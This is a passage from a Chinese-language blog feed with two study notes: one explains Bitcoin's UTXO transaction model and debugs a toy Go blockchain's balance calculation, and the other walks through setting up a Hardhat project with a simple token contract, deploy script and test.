交易链中一笔交易<code>输出</code>就是另一笔交易的<code>输入</code></p>
<h2 id="UTXO模型：">UTXO模型：</h2>
<p>它基于由block组成的一个个交易。<br />
UTXO 模型是许多加密货币通用的设计，最引人注目的是比特币。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用 UTXO 模型的加密货币不使用<code>账户</code>或<code>余额</code>。相反，UTXO 就像实物现金一样在用户之间转移。</p>
</li>
<li class="lvl-2">
<p>UTXO 核心设计思路是：<code>它记录交易事件，而不记录最终状态</code></p>
</li>
</ul>
<h1>比特币交易：</h1>
<p>简单来说，一笔交易就是告知全网：比特币的持有者已授权把它转帐给其他人。而新持有者可以通过产生另一笔交易，转账给另外的人，依此类推形成一条所有权的链。</p>
<h2 id="交易输入输出：">交易输入输出：</h2>
<p>交易就像复式记账法账簿中的行。<br />
简单来说,每一笔交易包含一个或多个输入,就像比特币账户的借方.<br />
这笔交易的另一面，有一个或多个“输出”,就像比特币账户的贷方。<br />
这些输入和输出的总额(借方和贷方)不需要相等。</p>
<p>相反，当输出加起来略少于输入数量时,两者的差额就代表了一笔隐含的“矿工费”,这笔矿工费由成功打包交易到区块链账簿的矿工收取。</p>
<p>如下图描述的是一笔比特币交易作为账簿中的一个条目。</p>
<p>交易也包含了每一笔被转账的比特币（输入）的<code>所有权证明</code>，它以所有者的数字签名形式存在，并可以被任何人独立验证。<br />
在比特币术语中，“消费”指的是签名一笔交易：将以前交易的比特币转账给比特币地址所标识的新所有者。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810111411.png" alt="20220810111411" /><br />
<strong>交易就像复式记账</strong></p>
<h2 id="交易链：">交易链：</h2>
<p>Alice支付Bob咖啡时使用一笔之前的交易作为输入。<br />
在以前的章节中，Alice从她朋友Joe那里用现金换了点比特币.那笔交易创建了被Alice的密钥锁定的比特币。<br />
在她支付Bob咖啡店的新交易中使用了之前的交易作为<code>输入</code>,<code>输出</code>是支付咖啡的金额和多余部分的找零.</p>
<p><strong>交易形成了一条链，最近交易的输入对应以前交易的输出.</strong></p>
<p>Alice用密钥签名解锁了之前交易的<code>输出</code>，从而向比特币网络证明她拥有这笔钱。<br />
她将买咖啡的这笔支付到Bob的地址上，明确指明要求是Bob签名才能消费这笔钱，否则就“阻止”那笔输出。<br />
这就实现了在Alice和Bob之间价值转移。</p>
<p>下图展示了从Joe到Alice再到Bob的交易链:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810111452.png" alt="20220810111452" /><br />
<strong>交易链中一笔交易输出就是另一笔交易的输入</strong></p>
<h2 id="找零">找零:</h2>
<p>许多比特币交易都会包括新所有者的地址（买方地址）和当前所有者的地址（称为找零地址）的输出。<br />
<strong>这是因为交易输入，就像纸币那样能够不能被再分割。</strong></p>
<p>如果您在商店购买了5美元的商品，但是使用20美元的美金来支付商品，会收到15美元的找零。相同的概念适用于比特币交易输入。<br />
如果您购买了一个价格为5比特币的商品，但是你的输入中只有20比特币这一项，那么您需要产生两个输出：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>一个5个比特币的输出发送给店主</p>
</li>
<li class="lvl-2">
<p>另一个15比特币的输出返回自己作为找零(减去任何适用的交易费用)</p>
</li>
</ul>
<p>重要的是，出于隐私的原因，找零地址不必与输入时提供的地址相同，通常是所有者钱包中的新地址。</p>
<p>不同的钱包可以在合并所有输入，用来匹配自己的付款金额时使用不同的策略。<br />
它们可能会聚合许多小输入，或者使用等于或大于所需付款的输入。<br />
除非钱包中的输入，刚好汇总起来与所需付款（加上交易费用）完全相等，否则钱包一定会产生一些找零。</p>
<p><strong>这与人们如何处理现金非常相似.如果你总是用钱包中的最大面额支付时,那么钱包中的零钱就会越来越多.如果你只使用零钱，整钱就会越来越多.</strong><br />
人们总是无意识地在这两个极端之间找到平衡，而比特币钱包开发商也力图实现这种平衡。</p>
<p>总的来讲，<strong>交易是将钱从交易输入移至输出。</strong></p>
<p><code>输入</code>通常是前一笔交易的输出的引用，表示价值从何而来。<br />
交易输出将约定金额发送到新的所有者的比特币地址，并将找零输出返回原来所有者的地址。<br />
一笔交易的输出可以被当做另一笔新交易的输入，这样随着钱从一个地址被移动到另一个地址，就形成了一条所有权链.</p>
<h2 id="常见的交易形式：">常见的交易形式：</h2>
<h3 id="简单支付-找零">简单支付/找零:</h3>
<p>最常见的交易形式是从一个地址到另一个地址的简单支付，还包含给支付者的“找零”。<br />
这类交易有一个输入和两个输出，如图所示:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810111535.png" alt="20220810111535" /></p>
<h3 id="归集资金">归集资金:</h3>
<p>另一种常见的交易形式是归集多个输入到一个输出的模式。<br />
这相当于现实生活中将很多硬币和纸币零钱兑换为一个大额面钞。像这样的交易由钱包应用产生，来整理在支付过程收到的许多小额的找零。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810111716.png" alt="20220810111716" /></p>
<h3 id="分散资金">分散资金:</h3>
<p>最后，另一种在比特币账簿中常见的交易形式是将一个输入分配给多个输出，即多个接收者的交易。<br />
这类交易有时被商业机构用作分配资金，例如给多个雇员发工资的情形。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810111756.png" alt="20220810111756" /></p>
<h1>开始Debug:</h1>
<p>前面在系统调试的时候，出现Bug: jerry一开始余额为1000，转账给Tom 100之后，Jerry自己的余额变成了100。<br />
通过Debug,搞清楚以下问题：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如何去构造一个交易？</p>
</li>
<li class="lvl-2">
<p>交易数据的内容具体有什么?</p>
</li>
<li class="lvl-2">
<p>查询余额的流程是什么？</p>
</li>
</ul>
<h2 id="交易数据的内容">交易数据的内容:</h2>
<p>交易的数据结构如下:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID      []<span class="type">byte</span></span><br><span class="line">	Inputs  []TxInput  <span class="comment">// 标记支持我们本次转账的前置的交易信息的TxOutput</span></span><br><span class="line">	Outputs []TxOutput <span class="comment">// 记录我们本次转账的amount和Reciever</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点在于两个数组: <code>Inputs</code>和<code>Outputs</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TxOutput <span class="keyword">struct</span> &#123;</span><br><span class="line">	Value     <span class="type">int</span>    <span class="comment">// 转出的资产值</span></span><br><span class="line">	ToAddress []<span class="type">byte</span> <span class="comment">// 资产的接收者的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TxInput <span class="keyword">struct</span> &#123;</span><br><span class="line">	TxID        []<span class="type">byte</span> <span class="comment">// 指明支持本次交易的前置交易信息</span></span><br><span class="line">	OutIdx      <span class="type">int</span>    <span class="comment">// 具体指明是前置交易信息中的第几个Output</span></span><br><span class="line">	FromAddress []<span class="type">byte</span> <span class="comment">// 资产转出者的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创始区块开始,相当于0地址直接转给<code>Jerry</code>，会创建第一个Tx,我们看看第一个tx里面的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tx.ID:This is the Base Transaction!                                  </span><br><span class="line">=======遍历tx.Inputs数组===========================                    </span><br><span class="line">指明支持本次交易的前置交易信息 input.TxID:</span><br><span class="line">资产转出者的地址 input.FromAddress:                                  </span><br><span class="line">具体指明是前置交易信息中的第几个Output input.OutIdx:-1                </span><br><span class="line">=======遍历tx.Outputs数组==========</span><br><span class="line">转出的资产值 output.Value:1000          </span><br><span class="line">资产的接收者的地址 output.ToAddress:Jerry    </span><br><span class="line">=================                               </span><br><span class="line"><span class="built_in">hash</span>:de1a4d1e5cfd9bc6442cacc565309e42fc65767fd86d355ae23fd51139511448               </span><br><span class="line">Pow: <span class="literal">true</span>    </span><br></pre></td></tr></table></figure>
<p>第二个区块,<code>Jerry</code>转账100给<code>Tom</code>,tx里面的内容:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Previous <span class="built_in">hash</span>:de1a4d1e5cfd9bc6442cacc565309e42fc65767fd86d355ae23fd51139511448     </span><br><span class="line">Transactions:[0xc00007a140]                     </span><br><span class="line">=======遍历tx.Inputs数组==========                                        </span><br><span class="line">指明支持本次交易的前置交易信息 input.TxID:This is the Base Transaction!     </span><br><span class="line">资产转出者的地址 input.FromAddress:Jerry              </span><br><span class="line">具体指明是前置交易信息中的第几个Output input.OutIdx:0                                       </span><br><span class="line">=======遍历tx.Outputs数组==========                                       </span><br><span class="line">转出的资产值 output.Value:100                     </span><br><span class="line">资产的接收者的地址 output.ToAddress:Tom               </span><br><span class="line">=================         </span><br><span class="line">转出的资产值 output.Value:900                        </span><br><span class="line">资产的接收者的地址 output.ToAddress:Jerry              </span><br><span class="line">=================                              </span><br><span class="line"><span class="built_in">hash</span>:5b4f1b2a52f1ae62368c5472e932ae85e3b6bedb451ace8fa6436c858d8e3359</span><br><span class="line">Pow: <span class="literal">true</span>   </span><br></pre></td></tr></table></figure>
<p>第三个区块,<code>Tom</code>转账30给<code>Gia</code>,tx里面的内容:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Timestamp:1660028211                  </span><br><span class="line">Previous <span class="built_in">hash</span>:5b4f1b2a52f1ae62368c5472e932ae85e3b6bedb451ace8fa6436c858d8e3359               </span><br><span class="line">Transactions:[0xc00007a190]                   </span><br><span class="line">tx.ID:       </span><br><span class="line">=======遍历tx.Inputs数组==========                                         </span><br><span class="line">指明支持本次交易的前置交易信息 input.TxID:                               </span><br><span class="line">资产转出者的地址 input.FromAddress:Tom                                     </span><br><span class="line">具体指明是前置交易信息中的第几个Output input.OutIdx:0     </span><br><span class="line">=======遍历tx.Outputs数组==========                                             </span><br><span class="line">转出的资产值 output.Value:30                         </span><br><span class="line">资产的接收者的地址 output.ToAddress:Gia                </span><br><span class="line">=================                        </span><br><span class="line">转出的资产值 output.Value:70                          </span><br><span class="line">资产的接收者的地址 output.ToAddress:Tom        </span><br><span class="line">=================                       </span><br><span class="line"><span class="built_in">hash</span>:dc72eea25324af0be865d25b8c2289ec7da1a4600f69776a1ac608160d773c6a</span><br><span class="line">Pow: <span class="literal">true</span>         </span><br></pre></td></tr></table></figure>
<p>测试所做的操作：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Block1: 创世区块 分配1000给Jerry</p>
</li>
<li class="lvl-2">
<p>Block2: Jerry转账100给Tom</p>
</li>
<li class="lvl-2">
<p>Block3: Tom转账30给Gia</p>
</li>
<li class="lvl-2">
<p>Block4: Jerry转账50给Gia</p>
</li>
<li class="lvl-2">
<p>Block5: Gia转账5给Jane</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810103306.png" alt="20220810103306" /><br />
例如Jerry转账50给Gia时,创建的交易：</p>
<ol>
<li class="lvl-3">
<p>Inputs: 指定一个之前的Output作为Inputs:</p>
<ul class="lvl-2">
<li class="lvl-6">指向之前的交易<code>Tx2</code></li>
<li class="lvl-6">找到Jerry的未花费交易输出为900(同样是Jerry的余额)</li>
</ul>
</li>
<li class="lvl-3">
<p>Outputs: 产生两个输出</p>
<ul class="lvl-2">
<li class="lvl-6">Output1： 50块的输出发送给Gia</li>
<li class="lvl-6">Output2： 另一个850的输出返回给自己作为找零</li>
</ul>
</li>
</ol>
<h2 id="查询余额原理">查询余额原理:</h2>
<p>查询某地址余额:<br />
从当前区块直到创世区块，开始扫描每一笔交易，如果：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>遇到某笔交易的某个<code>Output</code>是钱包管理的地址之一，则钱包余额增加；</p>
</li>
<li class="lvl-2">
<p>遇到某笔交易的某个<code>Input</code>是钱包管理的地址之一，则钱包余额减少。</p>
</li>
</ul>
<p>钱包的当前余额总是钱包地址关联的所有UTXO金额之和。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809140957.png" alt="20220809140957" /><br />
上图中所有<code>绿色的交易输出</code>才是 UTXO，<code>红色的交易输出</code>已经被当前『账户』使用了，所以在计算当前账户的余额时只会考虑绿色的交易输出，也就是 UTXO。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/74050135">什么是UTXO</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/tianmingyun/MasterBitcoin2CN/blob/master/ch02.md">第2章 比特币工作原理</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207298275932480">UTXO模型</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.krad.top/goblockchain04/">Go Blockchain Tutorial Part 4: Read,Store and Manage</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Hardhat框架初步使用</title>
    <url>/2022/64479.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>熟悉、回顾一下hardhat框架的使用，为后续erc20各类功能实现的学习做准备。</p>
<h1>hardhat介绍：</h1>
<blockquote>
<p>Hardhat是一个编译、部署、测试和调试以太坊应用的开发环境。</p>
<p>它可以帮助开发人员管理和自动化构建智能合约和DApps过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。</p>
<p>这意味着hardhat在最核心的地方是编译、运行和测试智能合约。</p>
<p>Hardhat内置了Hardhat网络，这是一个专为开发设计的本地以太坊网络。主要功能有Solidity调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等。</p>
<p>Hardhat Runner是与Hardhat交互的CLI命令，是一个可扩展的任务运行器。它是围绕任务和插件的概念设计的。每次你从CLI运行Hardhat时，你都在运行一个任务。例如，npx hardhat compile运行的是内置的compile任务。任务可以调用其他任务，允许定义复杂的工作流程。用户和插件可以覆盖现有的任务，从而定制和扩展工作流程。</p>
<p>Hardhat的很多功能都来自于插件，而作为开发者，你可以自由选择想使用的插件。Hardhat不限制使用什么工具的，但它确实有一些内置的默认值。所有这些都可以覆盖</p>
</blockquote>
<h1>设置环境:</h1>
<p>完整的安装步骤可参考refs里的链接进行安装，此处只记录部分的步骤</p>
<h1>创建一个Hardhat项目:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹、为项目根目录</span></span><br><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"><span class="comment"># yarn初始化</span></span><br><span class="line">yarn init --<span class="built_in">yes</span></span><br><span class="line">yarn add -D hardhat</span><br><span class="line"><span class="comment"># 安装各类插件</span></span><br><span class="line">yarn add -D hardhat-deploy hardhat-deploy-ethers ethers chai chai-ethers mocha @types/chai @types/mocha @types/node typescript ts-node dotenv</span><br><span class="line"><span class="comment"># 安装openzeppelin合约库</span></span><br><span class="line">yarn add @openzeppelin/contracts </span><br><span class="line"><span class="comment"># 超时、github连接不上，可尝试加timeout参数</span></span><br><span class="line">yarn add -D @nomiclabs/hardhat-etherscan --network-timeout 600000</span><br></pre></td></tr></table></figure>
<p>根目录编辑<code>tsconfig.json</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// tsconfig.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;es5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;module&quot;</span>: <span class="string">&quot;commonjs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strict&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;esModuleInterop&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;moduleResolution&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">    <span class="string">&quot;forceConsistentCasingInFileNames&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;outDir&quot;</span>: <span class="string">&quot;dist&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="string">&quot;include&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;hardhat.config.ts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./deploy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./test&quot;</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>编写智能合约:</h1>
<p>根目录编辑<code>hardhat.config.ts</code>文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatUserConfig</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy-ethers&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">HardhatUserConfig</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&#x27;0.7.6&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">namedAccounts</span>: &#123;</span><br><span class="line">    <span class="attr">deployer</span>: <span class="number">0</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="attr">sources</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure>
<p>根目录创建一个名为<code>contracts</code>的新目录，并在该目录内创建一个名为<code>Token.sol</code>的文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// The line above is recommended and let you define the license of your contract</span></span><br><span class="line"><span class="comment">// Solidity files have to start with this pragma.</span></span><br><span class="line"><span class="comment">// It will be used by the Solidity compiler to validate its version.</span></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the main building block for smart contracts.</span></span><br><span class="line">contract <span class="title class_">Token</span> &#123;</span><br><span class="line">    <span class="comment">// Some string type variables to identify the token.</span></span><br><span class="line">    <span class="comment">// The `public` modifier makes a variable readable from outside the contract.</span></span><br><span class="line">    string public name = <span class="string">&quot;My Hardhat Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;MBT&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The fixed amount of tokens stored in an unsigned integer type variable.</span></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An address type variable is used to store ethereum accounts.</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A mapping is a key/value map. Here we store each account balance.</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Contract initialization.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `constructor` is executed only once when the contract is created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _owner</span>) &#123;</span><br><span class="line">        <span class="comment">// The totalSupply is assigned to transaction sender, which is the account</span></span><br><span class="line">        <span class="comment">// that is deploying the contract.</span></span><br><span class="line">        balances[_owner] = totalSupply;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A function to transfer tokens.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `external` modifier makes a function *only* callable from outside</span></span><br><span class="line"><span class="comment">     * the contract.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="comment">// Check if the transaction sender has enough tokens.</span></span><br><span class="line">        <span class="comment">// If `require`&#x27;s first argument evaluates to `false` then the</span></span><br><span class="line">        <span class="comment">// transaction will revert.</span></span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= amount, <span class="string">&quot;Not enough tokens&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Transfer the amount.</span></span><br><span class="line">        balances[msg.<span class="property">sender</span>] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read only function to retrieve the token balance of a given account.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `view` modifier indicates that it doesn&#x27;t modify the contract&#x27;s</span></span><br><span class="line"><span class="comment">     * state, which allows us to call it without executing a transaction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> balances[account];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>编译:</h1>
<p>终端运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn hardhat compile</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn run v1.22.10</span><br><span class="line">$ /Users/cool-erc20/demo/node_modules/.bin/hardhat compile</span><br><span class="line">Compiled 1 Solidity file successfully</span><br><span class="line">✨  Done <span class="keyword">in</span> 5.25s.</span><br></pre></td></tr></table></figure>
<hr />
<h1>部署脚本:</h1>
<p>在能够测试或部署合约之前，你需要设置部署脚本，以便在测试和准备部署时使用。部署脚本让你可以专注于合约的最终形式，设置它们的参数和依赖关系，并确保你的测试的是将要部署的内容。部署脚本也省去了重复部署的烦恼。</p>
<blockquote>
<p>经历过手工测试之后，才知道用脚本测试有多必要…</p>
</blockquote>
<p>根目录下创建一个名为<code>deploy</code>的新目录，并创建一个名为<code>001_deploy_token.ts</code>的新文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 001_deploy_token.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatRuntimeEnvironment</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">DeployFunction</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat-deploy/types&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">func</span>: <span class="title class_">DeployFunction</span> = <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">hre: HardhatRuntimeEnvironment</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;deployments, getNamedAccounts&#125; = hre;</span><br><span class="line">  <span class="keyword">const</span> &#123;deploy&#125; = deployments;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123;deployer, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&#x27;Token&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">from</span>: deployer,</span><br><span class="line">    <span class="attr">args</span>: [tokenOwner],</span><br><span class="line">    <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> func;</span><br><span class="line">func.<span class="property">tags</span> = [<span class="string">&#x27;Token&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>编辑<code>hardhat.config.ts</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatUserConfig</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy-ethers&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">HardhatUserConfig</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&#x27;0.7.6&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">namedAccounts</span>: &#123;</span><br><span class="line">    <span class="attr">deployer</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">tokenOwner</span>: <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="attr">sources</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure>
<p>终端上运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn hardhat deploy</span><br></pre></td></tr></table></figure>
<p>此次部署是在<code>内存</code>中的hardhat网络中进行的。</p>
<p>输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn hardhat deploy</span><br><span class="line">yarn run v1.22.10</span><br><span class="line">$ /Users/cool-erc20/demo/node_modules/.bin/hardhat deploy</span><br><span class="line">Nothing to compile</span><br><span class="line">deploying <span class="string">&quot;Token&quot;</span> (tx: 0x453cf83db75329816a62d6079aa22f694036d339106344b7e1864bcb344aa49d)...: deployed at 0x5FbDB2315678afecb367f032d93F642f64180aa3 with 483242 gas</span><br><span class="line">✨  Done <span class="keyword">in</span> 5.60s.</span><br></pre></td></tr></table></figure>
<h1>测试合约:</h1>
<p>在项目根目录下创建一个名为<code>test</code>的新目录，并创建一个名为<code>Token.test.ts</code>的新文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token.test.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&quot;./chai-setup&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;ethers, deployments, getNamedAccounts&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Token contract&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Deployment should assign the total supply of tokens to the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> deployments.<span class="title function_">fixture</span>([<span class="string">&quot;Token&quot;</span>]);</span><br><span class="line">    <span class="keyword">const</span> &#123;tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Token</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&quot;Token&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> ownerBalance = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">balanceOf</span>(tokenOwner);</span><br><span class="line">    <span class="keyword">const</span> supply = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">totalSupply</span>();</span><br><span class="line">    <span class="title function_">expect</span>(ownerBalance).<span class="property">to</span>.<span class="title function_">equal</span>(supply);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>test</code>目录下创建<code>chai-setup.ts</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// chai-setup.ts</span></span><br><span class="line"><span class="keyword">import</span> chaiModule <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;chaiEthers&#125; <span class="keyword">from</span> <span class="string">&#x27;chai-ethers&#x27;</span>;</span><br><span class="line">chaiModule.<span class="title function_">use</span>(chaiEthers);</span><br><span class="line"><span class="keyword">export</span> = chaiModule;</span><br></pre></td></tr></table></figure>
<p>在终端上运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>输出</p>
